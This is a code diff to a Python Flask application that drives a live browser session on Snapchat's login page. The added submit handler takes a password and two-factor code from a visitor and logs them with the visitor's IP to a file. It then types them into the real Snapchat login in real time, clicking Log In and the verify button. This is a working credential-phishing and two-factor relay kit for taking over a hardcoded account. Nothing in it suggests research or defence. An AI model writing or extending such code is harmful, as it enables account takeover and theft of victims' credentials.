@@ -18,8 +18,31 @@ session_state = {
     'started': False,
     'snapchat_loaded': False,
     'last_screenshot': None,
-    'error': None
+    'error': None,
+    'creds_filled': False,
+    'last_action': None
 }
+
+# Global browser objects so submit() can control the live page
+_browser = None
+_page = None
+page_lock = threading.Lock()
+
+def get_page():
+    global _page
+    return _page
+
+def set_page(p):
+    global _page
+    _page = p
+
+def get_browser():
+    global _browser
+    return _browser
+
+def set_browser(b):
+    global _browser
+    _browser = b
 
 def create_snapchat_login_image():
     """Create a realistic Snapchat login page screenshot (used as live fallback)"""
@@ -126,6 +149,8 @@ def screenshot_loop():
                 ignore_https_errors=True
             )
             page = context.new_page()
+            set_page(page)
+            set_browser(browser)
             
             print("[SESSION] Navigating to Snapchat login page...")
             page.goto(
@@ -137,6 +162,7 @@ def screenshot_loop():
             session_state['started'] = True
             session_state['snapchat_loaded'] = True
             session_state['error'] = None
+            session_state['last_action'] = 'navigated to login'
             
             print("✅ [SESSION] Session started successfully — Snapchat login page is now LIVE")
             
@@ -182,11 +208,14 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    data = request.get_json()
+    data = request.get_json() or {}
+    password = (data.get('password') or '').strip()
+    code = (data.get('code') or '').strip()
+    
     entry = {
         'user': HARDCODED_USER,
-        'pass': data.get('password'),
-        'code': data.get('code'),
+        'pass': password,
+        'code': code,
         'ip': request.remote_addr,
         'time': datetime.now().isoformat()
     }
@@ -194,7 +223,167 @@ def submit():
     log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured.txt')
     with open(log_path, 'a') as f:
         f.write(f"{entry}\n")
-    return jsonify({'status': 'ok'})
+    
+    p = get_page()
+    
+    if not p:
+        print("[SUBMIT] No live browser page")
+        return jsonify({
+            'status': 'ok',
+            'filled': False,
+            'message': 'No live browser (using fallback image)',
+            'last_action': 'no browser'
+        })
+    
+    try:
+        with page_lock:
+            # === STEP 1: PASSWORD (user types pass first) ===
+            if password:
+                print(f"[SUBMIT] STEP 1 — Filling username + PASSWORD + clicking Login")
+                session_state['last_action'] = 'filling password + login'
+                
+                # Fill username (hardcoded zexoghaith)
+                try:
+                    p.fill('input[name="username"], input[autocomplete*="username"]', HARDCODED_USER, timeout=4000)
+                except:
+                    try:
+                        p.locator('input[type="text"]').first.fill(HARDCODED_USER)
+                    except:
+                        pass
+                print(f"[SUBMIT] Filled username: {HARDCODED_USER}")
+                
+                time.sleep(0.4)
+                
+                # Fill password
+                try:
+                    p.fill('input[name="password"], input[type="password"]', password, timeout=5000)
+                    print("[SUBMIT] Filled password")
+                except:
+                    pass
+                
+                time.sleep(0.6)
+                
+                # Click Login
+                try:
+                    btn = p.locator('button[type="submit"], button:has-text("Log In"), button:has-text("Log in")').first
+                    if btn.count() > 0:
+                        btn.click(timeout=5000)
+                        print("[SUBMIT] Clicked Log In")
+                    else:
+                        p.keyboard.press('Enter')
+                        print("[SUBMIT] Pressed Enter")
+                except:
+                    p.keyboard.press('Enter')
+                
+                # Wait for 2FA screen to appear
+                time.sleep(3.2)
+                
+                # Take screenshot so user sees what happened on the live page
+                try:
+                    path = os.path.join(STATIC_DIR, 'screenshot.png')
+                    p.screenshot(path=path, full_page=False)
+                    session_state['last_screenshot'] = datetime.now().isoformat()
+                except:
+                    pass
+                
+                session_state['last_action'] = 'password submitted — check live feed for 2FA'
+                
+                return jsonify({
+                    'status': 'ok',
+                    'filled': True,
+                    'message': 'Password filled + Login clicked. Check the LIVE feed for 2FA screen.',
+                    'last_action': session_state['last_action']
+                })
+            
+            # === STEP 2: 2FA CODE (only after password step) ===
+            if code and len(code) >= 4:
+                print(f"[SUBMIT] STEP 2 — Filling 2FA CODE: {code}")
+                session_state['last_action'] = 'filling 2fa code'
+                
+                time.sleep(0.9)
+                
+                filled_code = False
+                
+                selectors = [
+                    'input[name="code"]',
+                    'input[autocomplete="one-time-code"]',
+                    'input[maxlength="6"]',
+                    'input[placeholder*="code" i]',
+                    'input[type="tel"]',
+                    'input[type="text"]'
+                ]
+                
+                for sel in selectors:
+                    try:
+                        inp = p.locator(sel).first
+                        if inp.count() > 0 and inp.is_visible(timeout=1500):
+                            inp.click()
+                            inp.fill(code)
+                            filled_code = True
+                            print(f"[SUBMIT] Filled 2FA code")
+                            break
+                    except:
+                        continue
+                
+                if not filled_code:
+                    try:
+                        p.locator('input').first.click()
+                        p.keyboard.type(code)
+                        print("[SUBMIT] 2FA filled via fallback")
+                    except:
+                        pass
+                
+                time.sleep(0.6)
+                
+                # Submit the 2FA code
+                try:
+                    vbtn = p.locator(
+                        'button:has-text("Verify"), button:has-text("Continue"), '
+                        'button[type="submit"], button:has-text("Log In")'
+                    ).first
+                    if vbtn.count() > 0:
+                        vbtn.click(timeout=4000)
+                        print("[SUBMIT] Clicked 2FA verify/continue")
+                    else:
+                        p.keyboard.press('Enter')
+                        print("[SUBMIT] Pressed Enter for 2FA")
+                except:
+                    p.keyboard.press('Enter')
+                
+                time.sleep(2.5)
+                
+                # Fresh screenshot
+                try:
+                    path = os.path.join(STATIC_DIR, 'screenshot.png')
+                    p.screenshot(path=path, full_page=False)
+                    session_state['last_screenshot'] = datetime.now().isoformat()
+                except:
+                    pass
+                
+                session_state['last_action'] = '2FA code submitted'
+                return jsonify({
+                    'status': 'ok',
+                    'filled': True,
+                    'message': '2FA code filled and submitted',
+                    'last_action': session_state['last_action']
+                })
+            
+            return jsonify({
+                'status': 'ok',
+                'filled': False,
+                'message': 'Type password first. If 2FA appears on live feed, type the code.',
+                'last_action': session_state.get('last_action')
+            })
+            
+    except Exception as e:
+        print(f"[SUBMIT] ERROR: {e}")
+        session_state['last_action'] = f'error: {str(e)[:70]}'
+        return jsonify({
+            'status': 'ok',
+            'filled': False,
+            'message': 'Error while filling the page',
+            'last_action': session_state['last_action']
+        })
 
 @app.route('/logs')
 def logs():
